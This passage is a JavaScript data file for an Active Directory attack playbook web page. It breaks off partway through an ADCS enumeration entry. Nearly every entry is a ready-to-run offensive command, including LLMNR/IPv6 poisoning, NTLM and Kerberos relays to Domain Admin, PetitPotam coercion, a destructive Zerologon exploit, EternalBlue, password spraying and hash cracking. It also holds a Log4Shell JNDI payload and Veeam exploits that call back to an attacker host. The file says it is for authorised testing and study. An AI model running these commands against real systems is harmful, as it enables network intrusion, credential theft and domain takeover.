/*
  AD ATTACK PATH v2 — data for ad-map-v2.html

  A guided "playbook": colour-coded ACCESS SECTIONS you expand, each holding
  TECHNIQUE buttons you expand, each showing a Theory/CVE link, a short note,
  the commands, colour-coded OUTCOME badges, and "move to" pivots that jump to
  another (differently-coloured) section when your access changes.

  MODEL
    meta       title / version / note
    palette    named outcome colours (kept here so the scheme is consistent)
    sections[] {
      id, title, color(hex), tag, desc,
      techniques[] {
        id, title,
        theory : { label, url } | null,
        cve    : { id, label?, url? } | null,   // rendered as a CVE banner + chip
        desc   : "short note" | null,
        cmds   : [ "command", ... ],            // # comments are dimmed
        branches[] : {                          // optional nested sub-paths
          label, warn?(bool), cmds[], outcomes[]
        },
        outcomes[] : { label, color(hex) },     // colour-coded result badges
        moveTo[]   : { section, label?, note? }  // pivots to another section
      }
    }

  Extend the sections below — the page rebuilds itself automatically.
*/

var AD_MAP_V2 = {
  meta: {
    title: "AD Attack Path — Guided Playbook",
    version: "v2",
    note: "For authorised testing and study only. Click a section to expand it, then a technique for its commands."
  },

  // shared outcome palette (matches the section colours + result-box scheme)
  palette: {
    lavender:   "#cdc7e6",  // No Credentials
    blue:       "#3b9ee5",  // Valid user (Username)
    greenPale:  "#86efac",  // vulnerable host
    green:      "#4ade80",  // credentials obtained
    yellow:     "#ffe14a",  // poisoning / coerce
    orange:     "#e8912e"   // crackable hash
  },

  sections: [
    {
      id: "no-creds",
      title: "No Credentials",
      color: "#cdc7e6",
      tag: "Start here",
      desc: "You're on the network with no domain account yet — scan, find the domain, and hunt a first credential or hash.",
      techniques: [
        {
          id: "scan-network",
          title: "Scan network",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Sweep the subnet and fingerprint hosts/services to find domain controllers and vulnerable targets.",
          cmds: [
            "nxc smb <ip_range>",
            "nmap -sP -p <ip>",
            "nmap -Pn -sV --top-ports 50 --open <ip>",
            "nmap -Pn --script smb-vuln* -p139,445 <ip>",
            "nmap -Pn -sC -sV -oA <output> <ip>",
            "nmap -Pn -sC -sV -p- -oA <output> <ip>",
            "nmap -sU -sC -sV -oA <output> <ip>"
          ],
          outcomes: [{ label: "Vulnerable host", color: "#86efac" }],
          moveTo: []
        },
        {
          id: "find-dc-ip",
          title: "Find DC IP",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Identify the domain controllers via the local interface, DNS SRV records, and the Kerberos port.",
          cmds: [
            "nmcli dev show <interface>",
            "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
            "nmap -p 88 --open <ip_range>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "zone-transfer",
          title: "Zone transfer",
          theory: { label: "AD Fundamentals", url: "theory/2026-08-18-ad-fundamentals.html" },
          cve: null,
          desc: "Attempt an AXFR to pull the whole DNS zone and map internal hostnames.",
          cmds: [
            "dig axfr <domain_name> @<name_server>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "anon-guest-smb",
          title: "Anonymous & Guest access on SMB shares",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Null and guest sessions can leak users, shares and policy with no credentials.",
          cmds: [
            "nxc smb <ip_range> -u '' -p ''",
            "nxc smb <ip_range> -u 'a' -p ''",
            "enum4linux-ng.py -a -u '' -p '' <ip>",
            "smbclient -U '%' -L //<ip>"
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "enum-ldap",
          title: "Enumerate LDAP",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Probe LDAP for anonymous binds and directory data.",
          cmds: [
            "nmap -n -sV --script 'ldap* and not brute' -p 389 <dc_ip>",
            "ldapsearch -x -H <dc_ip> -s base"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "once enumeration yields a usable account" }]
        },
        {
          id: "enum-users",
          title: "Enumerate Users",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "RID-cycle and RPC-enumerate to build a username list.",
          cmds: [
            "nxc smb <dc_ip> --rid-brute 10000   # bruteforcing RID",
            "net rpc group members 'Domain Users' -W '<domain>' -l <ip> -U '%'"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "a valid username list feeds spraying / roasting" }]
        },
        {
          id: "bruteforce-users",
          title: "Bruteforce users",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Confirm which usernames exist via Kerberos pre-auth — no logon failure generated.",
          cmds: [
            "kerbrute userenum -d <domain> <userlist>",
            "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm='<domain>',userdb=<user_list_file>\" <dc_ip>"
          ],
          outcomes: [],
          moveTo: [{ section: "valid-user", label: "Username", note: "confirmed usernames feed spraying / roasting" }]
        },
        {
          id: "poisoning",
          title: "Poisoning",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Answer broadcast name-resolution or MITM the segment to capture / relay authentication.",
          cmds: [],
          branches: [
            { label: "LLMNR / NBT-NS / mDNS", cmds: ["responder -I <interface>"] },
            { label: "DHCPv6 (IPv6 preferred to IPv4)", warn: true, cmds: ["mitm6 -d <domain>", "bettercap"] },
            { label: "ARP Poisoning", warn: true, cmds: ["bettercap"] },
            { label: "AS-REQ roast (via poisoning)", cmds: ["Pcredz -i <interface> -v"], outcomes: [{ label: "Hash found ASREQ", color: "#e8912e" }] }
          ],
          outcomes: [
            { label: "poisoning SMB", color: "#ffe14a" },
            { label: "poisoning LDAP", color: "#ffe14a" },
            { label: "poisoning HTTP", color: "#ffe14a" }
          ],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "captured SMB/LDAP/HTTP auth can be relayed to a service that accepts it" }]
        },
        {
          id: "coerce",
          title: "Coerce",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: { id: "CVE-2022-26925", label: "Unauthenticated PetitPotam", url: "https://nvd.nist.gov/vuln/detail/CVE-2022-26925" },
          desc: "Force a host (often a DC) to authenticate to your listener so it can be relayed.",
          cmds: [
            "petitpotam.py -d <domain> <listener> <target>"
          ],
          outcomes: [{ label: "Coerce SMB", color: "#ffe14a" }],
          moveTo: [{ section: "mitm", label: "Listen & Relay", note: "the coerced authentication is relayed to LDAP(S)/HTTP/SMB" }]
        },
        {
          id: "pxe",
          title: "PXE",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "Pull SCCM PXE boot media to recover deployment credentials — no domain account needed.",
          cmds: [],
          branches: [
            { label: "no password", cmds: ["pxethief.py 1", "pxethief.py 2 <distribution_point_ip>"], outcomes: [{ label: "Credentials (NAA account)", color: "#4ade80" }] },
            { label: "password protected", cmds: ["tftp -i <dp_ip> GET \"\\xxx\\boot.var\"", "pxethief.py 5 \"\\xxx\\boot.var\""], outcomes: [{ label: "PXE Hash", color: "#e8912e" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "timeroasting",
          title: "TimeRoasting",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Abuse MS-SNTP to recover computer-account hashes with no authentication, to crack offline.",
          cmds: [
            "timeroast.py <dc_ip> -o <output_log>"
          ],
          outcomes: [{ label: "timeroast hash", color: "#e8912e" }],
          moveTo: []
        }
      ]
    },

    {
      id: "valid-user",
      title: "Valid user (no password)",
      color: "#3b9ee5",
      tag: "Have a username",
      desc: "You hold at least one valid username (and maybe a password) — spray for credentials and roast pre-auth-disabled accounts.",
      techniques: [
        {
          id: "pw-spray",
          title: "Password Spray",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Try one password across many users. Read the lockout policy FIRST so you don't lock accounts.",
          cmds: [],
          branches: [
            { label: "Get password policy — default policy", note: "You need creds, but get the policy first to avoid locking accounts.", cmds: [
              "nxc smb <dc_ip> -u '<user>' -p '<password>' --pass-pol",
              "Get-ADDefaultDomainPasswordPolicy",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> domain_policy"
            ] },
            { label: "Get password policy — Fine-Grained (privileged)", cmds: [
              "ldapsearch-ad.py --server <dc> -d <domain> -u <user> -p <pass> --type pass-pols",
              "Get-ADFineGrainedPasswordPolicy -filter *",
              "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> pso   # runs as low-priv too, with less info"
            ] },
            { label: "user == password", warn: true, cmds: [
              "nxc smb <dc_ip> -u <users.txt> -p <passwords.txt> --no-bruteforce --continue-on-success",
              "sprayhound -U <users.txt> -d <domain> -dc <dc_ip>   # --lower / --upper to case-fold; nothing = user==pass"
            ], outcomes: [{ label: "Clear text Credentials", color: "#4ade80" }] },
            { label: "Usual passwords (Season+Year!, Company123 …)", warn: true, cmds: [
              "nxc smb <dc_ip> -u <users.txt> -p <password> --continue-on-success",
              "sprayhound -U <users.txt> -p <password> -d <domain> -dc <dc_ip>",
              "kerbrute passwordspray -d <domain> <users.txt> <password>"
            ], outcomes: [{ label: "Clear text Credentials", color: "#4ade80" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "asreproast",
          title: "ASREPRoast",
          theory: { label: "AS-REP Roasting", url: "theory/2026-08-18-asrep-roasting.html" },
          cve: null,
          desc: "Accounts with Kerberos pre-auth disabled (and SPN-write via a pre-auth account) yield crackable tickets.",
          cmds: [],
          branches: [
            { label: "List ASREPRoastable users (need creds)", cmds: [
              "MATCH (u:User) WHERE u.dontreqpreauth = true AND u.enabled = true RETURN u   # BloodHound / Cypher"
            ] },
            { label: "ASREP roasting", cmds: [
              "GetNPUsers.py <domain>/ -usersfile <users.txt> -format hashcat -outputfile <output.txt>",
              "nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>",
              "Rubeus.exe asreproast /format:hashcat"
            ], outcomes: [{ label: "Hash found ASREP", color: "#e8912e" }] },
            { label: "Blind Kerberoasting", cmds: [
              "Rubeus.exe kerberoast /domain:<domain> /dc:<dcip> /nopreauth:<asrep_user> /spns:<users.txt>",
              "GetUserSPNs.py -no-preauth \"<asrep_user>\" -usersfile \"<user_list.txt>\" -dc-host \"<dc_ip>\" \"<domain>/\""
            ], outcomes: [{ label: "Hash found TGS", color: "#e8912e" }] },
            { label: "Kerberos RC4 downgrade", cve: "CVE-2022-33679", cmds: [
              "CVE-2022-33679.py <domain>/<user> <target>"
            ], outcomes: [{ label: "Lat move PTT", color: "#9ca3af" }] }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "mitm",
      title: "Man In The Middle (Listen and Relay)",
      color: "#ffe14a",
      tag: "Poison & relay",
      desc: "Capture authentication on the wire and relay it to a service that will accept it.",
      techniques: [
        {
          id: "listen",
          title: "Listen",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Answer name resolution / capture SMB authentication to obtain hashes or credentials.",
          cmds: [
            "responder -I <interface>   # use --lm to force a downgrade",
            "smbclient.py"
          ],
          outcomes: [
            { label: "Hash NTLMv1 or NTLMv2", color: "#e8912e" },
            { label: "Username", color: "#3b9ee5" },
            { label: "Credentials (ldap/http)", color: "#4ade80" }
          ],
          moveTo: []
        },
        {
          id: "ntlm-relay",
          title: "NTLM relay",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Relay captured/coerced NTLM authentication to a service, picking the target by what's unsigned/unenforced.",
          cmds: [],
          branches: [
            { label: "MS08-068 self relay", cmds: ["msf> exploit/windows/smb/smb_relay   # Windows 2000 / Server 2008"] },
            { label: "SMB → LDAP(S)", cve: "CVE-2019-1040", note: "NTLMv1: remove MIC (no CVE needed). NTLMv2: remove MIC (CVE-2019-1040).", outcomes: [{ label: "see LDAP(S)", color: "#ffe14a" }] },
            { label: "HTTP(S) → LDAP(S)", note: "Usually from a WebDAV coercion — HTTP auth relays cross-protocol.", outcomes: [{ label: "see LDAP(S)", color: "#ffe14a" }] },
            { label: "To LDAP(S) → RBCD", note: "Relay to LDAP when LDAP signing and LDAPS channel binding aren't enforced (the default).", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --add-computer <computer_name> <computer_password> --delegate-access"
            ], outcomes: [{ label: "RBCD", color: "#10b981" }] },
            { label: "To LDAP(S) → Shadow Credentials", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --shadow-credentials --shadow-target '<dc_name$>'"
            ], outcomes: [{ label: "Shadow Credentials", color: "#9ca3af" }] },
            { label: "To LDAP(S) → Domain Admin", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --escalate-user <user>"
            ], outcomes: [{ label: "Domain admin", color: "#ef4444" }] },
            { label: "To LDAP(S) → LDAP shell", cmds: [
              "ntlmrelayx.py -t ldaps://<dc_ip> --remove-mic -smb2support --interactive   # nc 127.0.0.1 10111"
            ], outcomes: [{ label: "LDAP SHELL", color: "#9ca3af" }] },
            { label: "To SMB (SMB not signed)", note: "Find unsigned targets (default on non-DCs), then relay.", cmds: [
              "nxc smb <ip_range> --gen-relay-list smb_unsigned_ips.txt",
              "ntlmrelayx.py -tf smb_unsigned_ips.txt -smb2support [--ipv6] -socks"
            ], outcomes: [{ label: "SMB Socks", color: "#9ca3af" }] },
            { label: "To HTTP → AD CS (ESC8)", note: "Relay to the CA web enrollment endpoint.", outcomes: [{ label: "ESC8", color: "#a855f7" }] },
            { label: "To HTTP → WSUS", note: "Relay to WSUS.", outcomes: [{ label: "WSUS", color: "#9ca3af" }] },
            { label: "To MSSQL", cmds: ["ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks"], outcomes: [{ label: "MSSQL Socks", color: "#9ca3af" }] },
            { label: "SMB → NETLOGON (Zerologon)", cve: "CVE-2020-1472", note: "Zero-Logon (safe method) — relay one DC to another.", cmds: [
              "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>"
            ], outcomes: [{ label: "DCSYNC", color: "#3b82f6" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "kerberos-relay",
          title: "Kerberos relay",
          theory: { label: "Coercion & NTLM Relay", url: "theory/2026-08-18-coercion-ntlm-relay.html" },
          cve: null,
          desc: "Relay Kerberos instead of NTLM (krbrelayx) — useful where NTLM is blocked but you can coerce Kerberos.",
          cmds: [],
          branches: [
            { label: "To HTTP → AD CS (ESC8)", cmds: [
              "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>"
            ], outcomes: [{ label: "ESC8", color: "#a855f7" }] },
            { label: "SMB → SMB", note: "Same as NTLM relay — use krbrelayx.py." },
            { label: "SMB → LDAP(S)", note: "Same as NTLM relay — use krbrelayx.py." }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "crack-hash",
      title: "Crack hash",
      color: "#e8912e",
      tag: "Offline cracking",
      desc: "You have captured or roasted a hash. Identify its type, then crack it offline with John or Hashcat to recover the plaintext.",
      techniques: [
        {
          id: "crack-lm",
          title: "LM  (299bd128c1101fd6)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "Legacy LM hash. Weak by design and quick to crack.",
          cmds: [
            "john --format=lm hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 3000 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Clear text password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-nt",
          title: "NT  (b4b9b02e6f09a9bd760...)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "NT hash (the modern Windows password hash).",
          cmds: [
            "john --format=nt hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Clear text password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-ntlmv1",
          title: "NTLMv1  (user::85D5BC...)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "NetNTLMv1 challenge/response. Can also be submitted to crack.sh, which recovers the NT hash from the DES keys.",
          cmds: [
            "john --format=netntlm hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>",
            "crack.sh"
          ],
          outcomes: [{ label: "Clear text password / NT hash", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-ntlmv2",
          title: "NTLMv2  (user::N46iSNek...)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "NetNTLMv2 challenge/response, typically captured with Responder.",
          cmds: [
            "john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 5600 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Clear text password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-krb5tgs",
          title: "Kerberos 5 TGS  ($krb5tgs$23$...)",
          theory: { label: "Kerberoasting", url: "theory/2026-08-18-kerberoasting.html" },
          cve: null,
          desc: "RC4 (etype 23) service ticket recovered from Kerberoasting.",
          cmds: [
            "john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>",
            "hashcat -m 13100 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Service account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-krb5tgs-aes",
          title: "Kerberos 5 TGS AES128  ($krb5tgs$17...)",
          theory: { label: "Kerberoasting", url: "theory/2026-08-18-kerberoasting.html" },
          cve: null,
          desc: "AES128 (etype 17) service ticket — slower to crack than RC4.",
          cmds: [
            "hashcat -m 19600 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Service account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-asrep",
          title: "Kerberos ASREP  ($krb5asrep$23...)",
          theory: { label: "AS-REP Roasting", url: "theory/2026-08-18-asrep-roasting.html" },
          cve: null,
          desc: "AS-REP for a pre-auth-disabled account, recovered from ASREPRoasting.",
          cmds: [
            "hashcat -m 18200 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-mscache2",
          title: "MSCache 2 (very slow)  ($DCC2$10240...)",
          theory: { label: "Password Cracking" },
          cve: null,
          desc: "Domain Cached Credentials v2 (mscash2). Very slow — cannot be relayed or replayed, only cracked.",
          cmds: [
            "hashcat -m 2100 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-timeroast",
          title: "Timeroast hash  ($sntp-ms$...)",
          theory: { label: "Kerberos Authentication", url: "theory/2026-08-18-kerberos.html" },
          cve: null,
          desc: "Computer-account hash recovered via MS-SNTP. Crack with a mask (machine passwords are long and random, so a wordlist rarely helps).",
          cmds: [
            "hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l?l"
          ],
          outcomes: [{ label: "Machine account password", color: "#4ade80" }],
          moveTo: []
        },
        {
          id: "crack-pxe",
          title: "PXE hash  ($sccm$aes128$...)",
          theory: { label: "SCCM / MECM Abuse", url: "theory/2026-09-24-sccm-mecm-abuse.html" },
          cve: null,
          desc: "SCCM PXE boot media password recovered with PXEThief.",
          cmds: [
            "hashcat -m 19850 -a 0 hash.txt <rockyou.txt>"
          ],
          outcomes: [{ label: "Deployment credentials", color: "#4ade80" }],
          moveTo: []
        }
      ]
    },

    {
      id: "quick-compromise",
      title: "Quick Compromise",
      color: "#e07b2e",
      tag: "Fast wins",
      desc: "Unauthenticated, high-impact exploits worth trying early. A single vulnerable service here can hand you Domain Admin or a foothold outright.",
      techniques: [
        {
          id: "qc-zerologon",
          title: "Zerologon (unsafe)",
          theory: null,
          cve: { id: "CVE-2020-1472", label: "Zerologon" },
          desc: "Resets the domain controller machine account password to empty. The exploit is destructive — it breaks the DC until the password is restored, so use with care.",
          cmds: [],
          branches: [
            { label: "Scan", warn: true, cmds: ["zerologon-scan '<dc_netbios_name>' '<ip>'"] },
            { label: "Exploit", warn: true, cmds: ["cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>"], outcomes: [{ label: "Domain admin", color: "#ef4444" }] }
          ],
          outcomes: [],
          moveTo: []
        },
        {
          id: "qc-eternalblue",
          title: "EternalBlue MS17-010",
          theory: null,
          cve: { id: "CVE-2017-0144", label: "EternalBlue" },
          desc: "SMBv1 remote code execution. Only targets hosts still exposing SMBv1.",
          cmds: [
            "msf> exploit/windows/smb/ms17_010_eternalblue   # SMBv1 only"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-tomcat",
          title: "Tomcat / JBoss Manager",
          theory: null,
          cve: null,
          desc: "Weak or default manager credentials allow deploying a malicious WAR for code execution.",
          cmds: [
            "msf> auxiliary/scanner/http/tomcat_enum",
            "msf> exploit/multi/http/tomcat_mgr_deploy"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-javarmi",
          title: "Java RMI",
          theory: null,
          cve: null,
          desc: "Exposed Java RMI registries can allow remote class loading and code execution.",
          cmds: [
            "msf> use exploit/multi/misc/java_rmi_server"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-javaser",
          title: "Java Serialized port",
          theory: null,
          cve: null,
          desc: "Ports accepting serialized Java objects can be exploited with ysoserial gadget chains.",
          cmds: [
            "ysoserial.jar <gadget> '<cmd>' | nc <ip> <port>"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-log4shell",
          title: "Log4Shell",
          theory: null,
          cve: { id: "CVE-2021-44228", label: "Log4Shell" },
          desc: "A crafted string logged by a vulnerable Log4j triggers a JNDI lookup to your server and remote code execution.",
          cmds: [
            "${jndi:ldap://<ip>:<port>/o=reference}"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-database",
          title: "Database",
          theory: { label: "MSSQL Server Abuse", url: "theory/2026-09-24-mssql-server-abuse.html" },
          cve: null,
          desc: "Enumerate SQL logins and hunt weak or default credentials on exposed database services.",
          cmds: [
            "msf> use auxiliary/admin/mssql/mssql_enum_sql_logins"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-exchange",
          title: "Exchange (ProxyShell)",
          theory: null,
          cve: { id: "CVE-2021-34473", label: "ProxyShell" },
          desc: "Chained Exchange vulnerabilities give unauthenticated remote code execution as SYSTEM.",
          cmds: [
            "proxyshell_rce.py -u https://<exchange> -e administrator@<domain>"
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "qc-veeam",
          title: "Veeam",
          theory: null,
          cve: null,
          desc: "A run of Veeam Backup vulnerabilities recover stored credentials or give authentication bypass and code execution.",
          cmds: [],
          branches: [
            { label: "Credentials — Veeam backup", cve: "CVE-2023-27532", cmds: [
              "VeeamHax.exe --target <veeam_server>",
              "CVE-2023-27532 net.tcp:/<target>:<port>/"
            ] },
            { label: "Auth bypass — Veeam Backup Enterprise Manager", cve: "CVE-2024-29849", cmds: [
              "CVE-2024-29849.py --target https://<veeam_ip>:<veeam_port>/ --callback-server <attacker_ip>:<port>"
            ] },
            { label: "Auth bypass — Veeam Recovery Orchestrator", cve: "CVE-2024-29855", cmds: [
              "CVE-2024-29855.py --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/"
            ] },
            { label: "Unserialize — Veeam backup", cve: "CVE-2024-40711", cmds: [
              "CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>"
            ] }
          ],
          outcomes: [{ label: "User Account", color: "#4ade80" }, { label: "Low access", color: "#c3b4de" }, { label: "Admin", color: "#f4b6b6" }],
          moveTo: []
        },
        {
          id: "qc-glpi",
          title: "GLPI",
          theory: null,
          cve: null,
          desc: "GLPI asset-management vulnerabilities leading to code execution or SQL injection.",
          cmds: [],
          branches: [
            { label: "htmLawed RCE", cve: "CVE-2022-35914", cmds: [
              "/vendor/htmlawed/htmlawed/htmLawedTest.php"
            ] },
            { label: "SQL injection", cve: "CVE-2023-41320", cmds: [
              "cve_2023_41320.py -u <user> -p <password> -t <ip>"
            ] }
          ],
          outcomes: [{ label: "Admin", color: "#f4b6b6" }, { label: "Low access", color: "#c3b4de" }],
          moveTo: []
        },
        {
          id: "qc-weakweb",
          title: "Weak websites / services",
          theory: null,
          cve: null,
          desc: "Mass-scan for low-hanging vulnerabilities across web and network services.",
          cmds: [],
          branches: [
            { label: "nuclei", cmds: ["nuclei -target <ip_range>"] },
            { label: "nessus", note: "Authenticated / unauthenticated vulnerability scan." }
          ],
          outcomes: [],
          moveTo: []
        }
      ]
    },

    {
      id: "valid-creds",
      title: "Valid Credentials",
      color: "#2fd44f",
      tag: "Cleartext / NT hash / ticket",
      desc: "You hold a working credential — cleartext password, NT hash, or Kerberos ticket. Enumerate the domain thoroughly, then pivot toward roasting, coercion, ADCS/SCCM, and lateral movement.",
      techniques: [
        {
          id: "vc-find-users",
          title: "Find all users",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Pull the full user list now that you can authenticate.",
          cmds: [
            "GetADUsers.py -all -dc-ip <dc_ip> <domain>/<username>",
            "nxc smb <dc_ip> -u '<user>' -p '<password>' --users"
          ],
          outcomes: [{ label: "Username", color: "#3b9ee5" }],
          moveTo: []
        },
        {
          id: "vc-enum-smb",
          title: "Enumerate SMB shares",
          theory: null,
          cve: null,
          desc: "Spider readable shares for passwords, config files, and secrets.",
          cmds: [
            "nxc smb <ip_range> -u '<user>' -p '<password>' -M spider_plus",
            "nxc smb <ip_range> -u '<user>' -p '<password>' --shares [--get-file \\\\<filename> <filename>]",
            "manspider <ip_range> -c passw -e <file_extensions> -d <domain> -u <user> -p <password>"
          ],
          outcomes: [{ label: "Scroll shares", color: "#9ca3af" }],
          moveTo: []
        },
        {
          id: "vc-bloodhound-legacy",
          title: "BloodHound Legacy",
          theory: null,
          cve: null,
          desc: "Collect graph data (users, shares, ACLs, delegation) for the legacy BloodHound.",
          cmds: [
            "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
            "rusthound -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z",
            "import-module sharphound.ps1; invoke-bloodhound -collectionmethod all -domain <domain>",
            "sharphound.exe -c all -d <domain>"
          ],
          outcomes: [{ label: "ACL", color: "#3b9ee5" }, { label: "Delegation", color: "#34d399" }, { label: "Username", color: "#3b9ee5" }],
          moveTo: [{ section: "acls-aces", label: "ACLs / ACEs permissions", note: "graph edges reveal abusable ACLs" }]
        },
        {
          id: "vc-bloodhound-ce",
          title: "BloodHound CE",
          theory: null,
          cve: null,
          desc: "Same collection for the Community Edition (BloodHound CE) schema.",
          cmds: [
            "bloodhound-python -d <domain> -u <user> -p <password> -gc <dc> -c all",
            "rusthound-ce -d <domain_to_enum> -u '<user>@<domain>' -p '<password>' -o <outfile.zip> -z --ldap-filter (objectGuid=*)",
            "sharphound.exe -c all -d <domain>",
            "SOAPHound.exe -c c:\\temp\\cache.txt --bhdump -o c:\\temp\\bloodhound-output --autosplit --threshold 900"
          ],
          outcomes: [{ label: "ACL", color: "#3b9ee5" }, { label: "Delegation", color: "#34d399" }, { label: "Username", color: "#3b9ee5" }],
          moveTo: [{ section: "acls-aces", label: "ACLs / ACEs permissions", note: "graph edges reveal abusable ACLs" }]
        },
        {
          id: "vc-enum-ldap",
          title: "Enumerate LDAP",
          theory: { label: "LDAP and the AD Database", url: "theory/2026-08-18-ldap.html" },
          cve: null,
          desc: "Dump the directory for ACLs, delegation, and attributes.",
          cmds: [
            "ldeep ldap -u <users> -p '<password>' -d <domain> -s ldap://<dc_ip> all <backup_folder>",
            "ldapdomaindump.py -u <user> -p <password> -o <dump_folder> ldap://<dc_ip>:389",
            "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all"
          ],
          outcomes: [{ label: "ACL", color: "#3b9ee5" }, { label: "Delegation", color: "#34d399" }, { label: "Username", color: "#3b9ee5" }],
          moveTo: []
        },
        {
          id: "vc-enum-dns",
          title: "Enumerate DNS",
          theory: null,
          cve: null,
          desc: "List AD-integrated DNS zones to discover new internal targets.",
          cmds: [
            "adidnsdump -u <domain>\\<user> -p \"<password>\" --print-zones <dc_ip>"
          ],
          outcomes: [{ label: "New targets (low-hanging fruit)", color: "#a7d8ae" }],
          moveTo: []
        },
        {
          id: "vc-enum-adcs",
          title: "Enumerate ADCS",
          theory: { label: "Shadow Credentials & PKINIT", url: "theory/2026-09-24-shadow-credentials-pkinit.html" },
          cve: null,
          desc: "Find certificate templates and CAs, then check for the ESC misconfigurations.",
          cmds: [
            "certify.exe find",
            "certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>"
          ],
